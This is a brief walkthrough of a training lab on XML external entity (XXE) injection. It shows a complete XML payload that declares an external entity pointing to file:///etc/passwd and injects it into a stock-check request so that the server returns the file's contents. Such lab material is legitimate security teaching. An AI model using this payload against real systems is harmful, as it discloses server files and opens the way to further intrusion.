# Lab: Exploiting XXE using external entities to retrieve files

Turn on the proxy and request a product's stock. Send the request to the repeater and modify the XML to: 
```
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck>
            <productId>
                &xxe;
            </productId>
            <storeId>
                1
            </storeId>
        </stockCheck>
```

Send the request to return the contents of /etc/passwd and complete the lab.
